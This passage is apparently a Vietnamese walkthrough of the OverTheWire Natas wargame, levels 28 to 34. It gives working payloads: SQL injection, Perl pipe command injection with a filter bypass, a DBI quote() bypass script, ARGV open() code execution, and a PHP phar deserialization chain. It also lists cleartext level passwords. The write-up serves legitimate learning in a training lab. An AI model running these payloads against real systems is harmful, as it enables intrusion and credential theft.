- Trường hợp của tôi thì tôi chọn cách nhanh hơn đó chính là đoán. Tôi nghĩ rằng nó cũng sẽ khá giống level trước nên thử thực hiện câu lệnh `UNION all SELECT password from users;#`. Lúc này giá trị ta cần truyền vào query sẽ là `G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeXoOyUvkrgxdM%2BDkRMzP%2BUKOOQLCXM3rIJ7rtxNZvxE42S5CqL4w5TJ29rb8yB7YPvfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D`. Và quan sát thấy rằng chúng ta đã có được password cho level tiếp theo.

    ![](https://i.imgur.com/YTrAtxn.png)


---
### 29. Lv28 -> Lv29

>username/password : **natas29/pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno** 

Level này cho phép chúng ta đọc những văn bản tùy theo lựa chọn của chúng ta.

![](https://i.imgur.com/DqdK6Sp.png)

Qua quá trình đọc thì cũng chả thấy có gì hữu ích từ các văn bản này. Nhưng điều đáng chú ý ở đây đó chính là URL

![](https://i.imgur.com/fzgiF9F.png)

Ở đây là index.pl. Mà ta biết trong Linux, tệp tin có đuôi `.pl` là các tệp `Perl Script`, đây là các tệp văn bản chứa mã nguồn được viết bằng ngôn ngữ lập trình Perl. Vậy có thể đoán rằng đây là một `Perl Script` và được nhận tham số từ file. 

Vậy nếu chúng ta thực hiện pipe line thì kết quả sẽ như thế nào. Cùng thử với payload `http://natas29.natas.labs.overthewire.org/index.pl?file=|id%00` trong đó ký tự null "%00" được thêm vào để xóa bỏ các ký tự đằng sau trong chuỗi truy vấn. Quan sát được là chúng ta đã thành công nối lệnh và thực hiện nó.

![](https://i.imgur.com/0uE35Y8.png)

Vậy ta chỉ cần đọc file tại đường dẫn `/etc/natas_webpass/natas30` là có thể lấy được password. Tuy nhiên kết quả không như ta mong đợi. Có vẻ đã có cơ chế kiểm tra nào đó.

![](https://i.imgur.com/bZXvzN4.png)


Chúng ta thử đọc nội dung file `index.pl` để kiểm tra xem nó hoạt động như thế nào.
```
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}

```

Có thể thấy ở đây nó filter keyword `natas` nên chúng ta không thể đọc trực tiếp được như thế. Chúng ta cần phải thực hiện bypass qua cơ chế đó bằng payload `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/na%27%27tas_webpass/nat%27%27as30%00`. Ở đây ta thêm dấu %27%27 tức là dấu '' để có thể bypass được filter keyword `natas` bởi vì các ký tự đặc biệt như "" hoặc '' không được coi là các ký tự đặc biệt và được gửi đến lệnh `cat` để xử lý là một phần của tên tệp tin. Quan sát và thấy được rằng chúng ta đã có thể đọc được file `/etc/natas_webpass/natas30` và lấy được password cho level tiếp theo.

![](https://i.imgur.com/F34LTBs.png)


---
### 30. Lv29 -> Lv30

>username/password : **natas30/Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X** 

Level cung cấp cho chúng ta một form đăng nhập. Thử thực hiện một số thao tác giao diện thì cũng không thấy gì đặc biệt.

![](https://i.imgur.com/kbUx8nn.png)

Nhấn vào xem source code để hiểu cách hoạt động của nó.
```
if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    }
    else{
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}

```
Có thể thấy đây là đoạn code Perl được sử dụng để xử lý các yêu cầu HTTP được gửi đến máy chủ web. Nó chứa một điều kiện `IF` để kiểm tra xem yêu cầu được gửi đến có phải là một yêu cầu `POST` không, và có chứa tham số `username` và `password` hay không. Nếu phải thì sẽ kết nối đến cơ sở dữ liệu MySQL thông qua đối tượng `DBI`. Sau đó, nó sẽ thực hiện một truy vấn SQL để lấy dữ liệu từ bảng `users` trong cơ sở dữ liệu.
Trong truy vấn SQL này, các giá trị của các tham số `username` và `password` sẽ được trích xuất và đưa vào truy vấn bằng cách sử dụng phương thức `quote` của đối tượng DBI, để tránh các lỗ hổng bảo mật như tấn công SQL injection.
Sau khi truy vấn SQL được thực thi, đoạn mã sẽ kiểm tra kết quả trả về từ truy vấn và in ra thông báo `win!` và kết quả trả về nếu có bản ghi tương ứng trong cơ sở dữ liệu, hoặc thông báo `fail :(` nếu không tìm thấy bản ghi nào. Cuối cùng là đóng kết nối với cơ sở dữ liệu.

Đây chắc chắn là phải thực hiện tấn công SQLi, vậy nên ta cần bypass được phương thức `quote`. Ta biết rằng phương thức `quote` được sử dụng để bảo vệ truy vấn SQL tránh bị tấn công SQLi bằng cách đặt dấu ngoặc đơn hoặc dấu ngoặc kép xung quanh các giá trị được truyền vào truy vấn. Tuy nhiên, nếu các giá trị được truyền vào truy vấn không được xử lý đúng cách, vẫn có thể gây ra lỗ hổng bảo mật.

Sau quá trình tìm kiếm thì ta có thể bypass được cơ chế này bằng cách truyền vào là một mảng, thay vì là một chuỗi đơn như bình thường.
Payload cụ thể sẽ như sau 
```
import requests

url = "http://natas30.natas.labs.overthewire.org/index.pl"

s = requests.Session()
s.auth = ('natas30', 'Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X')

args = { "username": "natas31", "password": ["'' or 1=1-- -",2] }
r = s.post(url,  data=args)
print (r.text)
```
Vì phương thức `quote` của Perl chỉ bảo vệ giá trị đầu tiên của mảng được truyền vào, và bỏ qua các giá trị còn lại. Hoặc khi sử dụng quote dưới dạng list cùng với `SQL_INTEGER` là tham số thứ 2 như payload ở trên thì sẽ trả về giá trị unquote. Vì vậy ở đây câu lệnh query sẽ là 

`Select * FROM users where username ='natas31' and password ='' OR 1=1-- -`

Vậy nên ta có thể khai thác được lỗ hỏng SQLi và truy cập vào lấy được password cho level tiếp theo.

![](https://i.imgur.com/Xw6z4Mu.png)


---
### 31. Lv30 -> Lv31

>username/password : **natas31/AMZF14yknOn9Uc57uKB02jnYuhplYka3** 

Ở level này sẽ cho phép chúng ta tải tệp `.csv` lên và thay đổi nó thành một bảng đẹp mắt hơn. Ví dụ ở đây ta có một file address.cvs như sau 

![](https://i.imgur.com/4uzBP6k.png)

Sau khi upload lên trang web thì kết quả sẽ như thế này 

![](https://i.imgur.com/HsF8G7h.png)

Nhấn vào xem source code để hiểu cách hoạt động của nó.
```
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
else{
print <<END;

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
END
}
```
Đầu tiên, đoạn mã sử dụng phương thức upload của đối tượng CGI để kiểm tra xem người dùng đã tải lên một file hay chưa. Nếu có file được tải lên, đoạn mã sẽ đọc dữ liệu từ file bằng cách sử dụng phương thức param của đối tượng CGI, sau đó sử dụng vòng lặp while để duyệt qua các dòng trong file.Nếu người dùng chưa tải lên file, đoạn mã sẽ hiển thị một form cho phép người dùng tải lên

Trong trường hợp nếu `filename = ARGV` thì ` while (<$file>)`sẽ lặp qua `argument`, với mỗi `argument` sẽ thực hiện gọi `open()`. Nó xẽ giúp chúng ta thực thi code.

Ý tưởng đã có, chúng ta cùng thực hiện theo các bước sau :
- Đầu tiên thực hiện bắt request một file `.csv` 
- Sau đó chỉnh sửa request một chút
    - Thay vì gửi POST /index.pl thì ta sẽ POST /index.pl?/bin/cat%20/etc/natas_webpass/natas32%20%7C. Trong đó %7C là dấu `|` để chắc chắn rằng `argument` này được hiểu như là một lệnh.
    - Ta cần thêm` filename = ARGV` để có thể truyền `argument` và thực thi code.

        ![](https://i.imgur.com/W1l0XxT.png)

- Cuối cùng nhấn `forward` để gửi request đi 

![](https://i.imgur.com/NINRsTh.png)

Quan sát và thấy rằng ta đã có được password cho level tiếp theo. 

---
### 32. Lv31 -> Lv32

>username/password : **natas32/Yp5ffyfmEdjvTOwpN5HCvh7Ctgf9em3G** 

Sau khi kiểm tra code và quan sát giao diện thì xác nhận rằng level này tương tự như level trước.
Ta thử thực hiện giống như level trước để lấy password xem thì không thể thấy kết quả, có thể là bị cơ chế nào đó ngăn cản hoặc là ta không có quyền đọc tệp đó.

![](https://i.imgur.com/515yoVf.png)

Quan sát hint ở đây bảo ta là cần tìm ra một tệp binary trong webroot và thực thi nó để có được password.
Vậy nên ta thử tìm kiếm xem có file nào khả nghi hay không bằng câu lệnh `ls -al .`. Tức payload của chúng ta lúc này sẽ là `POST /index.pl?/bin/ls%20-al%20.%20%7C` và thêm` filename = ARGV` giống ở level trước để có thể truyền `argument` và thực thi code.

![](https://i.imgur.com/BM0M8ug.png)

Kết quả cho thấy có một file getpassword với quyền root mà chúng ta có quyền thực thi. Có vẻ chính là thứ ta cần tìm. Thực thi nó bằng payload `POST /index.pl?./getpassword%20%7C`và thêm` filename = ARGV` giống ở level trước để có thể truyền `argument` và thực thi code.

![](https://i.imgur.com/bDygZM0.png)

Kết quả cho thấy ta đã thực thi thành công một tệp binary trong webroot và có được password cho level tiếp theo.

---
### 33. Lv32 -> Lv33

>username/password : **natas33/APwWDD3fRAf6226sgBOBaSptGwvXwQhG** 

Ở level này tiếp tục cung cấp cho ta cơ chế upload 

![](https://i.imgur.com/oT37CyE.png)

Nhấn vào xem source code để hiểu cách hoạt động của nó.
```
<?php
            // graz XeR, the first to solve it! thanks for the feedback!
            // ~morla
            class Executor{
                private $filename=""; 
                private $signature='adeafbadbabec0dedabada55ba55d00d';
                private $init=False;

                function __construct(){
                    $this->filename=$_POST["filename"];
                    if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
                        echo "File is too big<br>";
                    }
                    else {
                        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                            echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                            echo "Firmware upgrad initialised.<br>";
                        }
                        else{
                            echo "There was an error uploading the file, please try again!<br>";
                        }
                    }
                }

                function __destruct(){
                    // upgrade firmware at the end of this script

                    // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
                    chdir("/natas33/upload/");
                    if(md5_file($this->filename) == $this->signature){
                        echo "Congratulations! Running firmware update: $this->filename <br>";
                        passthru("php " . $this->filename);
                    }
                    else{
                        echo "Failur! MD5sum mismatch!<br>";
                    }
                }
            }
        ?>
```

Đoạn code trên định nghĩa một class có tên là `Executor` có 3 thuộc tính private: `filename`,`signature`,`init`. Cùng 2 phương thức :
-  `__construct()`: khởi tạo biến `$filename` với giá trị của` $_POST["filename"]`. Sau đó, nó kiểm tra xem kích thước tệp tải lên có nhỏ hơn hoặc bằng 4096 byte hay không. Nếu kích thước tệp nằm trong giới hạn, nó sẽ upload lên thư mục /natas33/upload/ với tên tệp đã chỉ định và hiển thị một thông báo thành công.
-  `__destruct()`: Nó thay đổi thư mục làm việc hiện tại thành `/natas33/upload/` và kiểm tra xem giá trị MD5 của tệp tải lên có khớp với `signature` hay không. Nếu khớp nhau, nó in ra một thông báo thành công và thực thi tệp đã tải lên bằng cách sử dụng hàm `passthru()`. Ngược lại nó in ra một thông báo thất bại.

Ý tưởng của ta ở đây sẽ là tải lên một tập tin `php` sao cho bypass được cơ chế kiểm ra `signature` và có thể thực thi được tập tin đó để lấy được password cho level tiếp theo. Ta biết rằng MD5 là một thuật toán outdate và có tồn tại lỗ hỏng collision. Tuy nhiên việc tìm ra được collision cho `adeafbadbabec0dedabada55ba55d00d` và giới hạn file là `4096 bytes` là một điều khá khó.

Vậy nên ta sẽ thay đổi ý tưởng. Ở đây chúng ta có thể kiểm soát được tham số `filename` và `file content` và hàm `md5_file()` có thể đọc `Phar stream`.

Ý tưởng của chúng ta lúc này sẽ là đóng gói một file `php` có chứa code thực thi để lấy password bằng `Phar` và cố gắng mở nó bằng `phar://` để thực thi. Vì `Phar` sẽ chứa metadata ở dạng serialized. Khi mở bằng `phar://` thì nó sẽ được unserialized. Điều này giúp nó thực thi được.

Giải thích về `Phar` và `phar://` như sau:

- Phar là viết tắt của `PHP Archive`, đây là một định dạng file được sử dụng để lưu trữ và phân phối các ứng dụng PHP. Nó cho phép bạn gói gọn các tệp và thư mục của ứng dụng PHP thành một tập tin duy nhất, giúp việc triển khai ứng dụng trở nên dễ dàng hơn.

- `phar://` là một wrapper URL được sử dụng để truy cập các tệp bên trong một file phar. Khi bạn sử dụng `phar://` với một đường dẫn, PHP sẽ tự động hiểu rằng bạn muốn truy cập tệp bên trong một file phar thay vì một tệp bình thường. Ví dụ: `phar://myapp.phar/index.php` sẽ truy cập tệp `index.php` bên trong file `myapp.phar`.


Ý tưởng đã có chúng ta cùng thực hiện nó theo các bước sau:
- Đầu tiên ta tạo một file `lv33_readpass.php` để đọc file password tại `/etc/natas_webpass/natas34`

    ```
    <?php system('cat /etc/natas_webpass/natas34'); ?>
    ```
- Sau đó thực hiện upload file này lên hệ thống với tên là `lv33_readpass.php`.

    ![](https://i.imgur.com/i5SKHV9.png)

- Tiếp đó thực hiện tạo ra một tập tin có tên là `test.phar` với một tệp tin bên trong có tên `test.txt`. Và đặt dữ liệu metadata vào `phar` tức là giá trị serialized object `Executor`.

    ```
    <?php
	class Executor {
	    private $filename = "lv33_readpass.php"; 
        private $signature = True;
        private $init = false;
	}

	$phar = new Phar("test.phar");
	$phar->startBuffering();
	$phar->addFromString("test.txt", 'test');
	$phar->setStub("<?php __HALT_COMPILER(); ?>");
	$o = new Executor();
	$phar->setMetadata($o);
	$phar->stopBuffering();
    ?>
    ```
    
    - `Phar::startBuffering()` bắt đầu bộ đệm cho phar
    - `Phar::addFromString()` thêm nội dung của tệp tin "test.txt" vào phar với nội dung là "test".
    - `Phar::setStub()` đặt stub (tiền đề) cho phar. Trong trường hợp này, stub được sử dụng là `<?php__HALT_COMPILER(); ?>` để đảm bảo rằng phar sẽ không chạy bất kỳ mã PHP nào sau đó khi nó được thực thi.
    - `Phar::setMetadata()` đặt dữ liệu metadata vào phar. 
    - `Phar::stopBuffering()` dừng bộ đệm cho phar

Object này có giá trị thuộc tính `filename=lv33_readpass.php`, `signature=True`. Điều này giúp cho việc kiểm tra cơ chế signature luôn đúng. Giúp dễ ta thực hiện file `lv33_readpass.php`.
- Thực thi đoạn code trên để tạo file và upload file đó lên hệ thống với tên là `test.phar` .

    ![](https://i.imgur.com/ksc7QII.png)

- Sử dụng lại request upload lúc nãy nhưng lần này sẽ đổi tên thành `phar://test.phar/test.txt`. Điều này sẽ giúp chúng ta truy cập tệp `test.txt` bên trong file `test.phar`. Và đương nhiên khi dùng `phar:// `để truy cập tệp này thì `metadata` sẽ được unserialized. Điều này giúp file code đọc password của chúng ta thực thi được.
    
    ![](https://i.imgur.com/SXcLW1L.png)

- Quan sát và thấy rằng chúng ta thực thi được file `lv33_readpass.php` và đã nhận được password cho level tiếp theo.

    ![](https://i.imgur.com/8frvelo.png)

---
### 34. Lv33 -> Lv34

>username/password : **natas34/F6Fcmavn8FgZgrAPOvoLudNr1GwQTaNG** 

Level này hiện tại vẫn chưa có nên cơ bản là chúng ta đã hoàn thành tất cả các level natas.

---
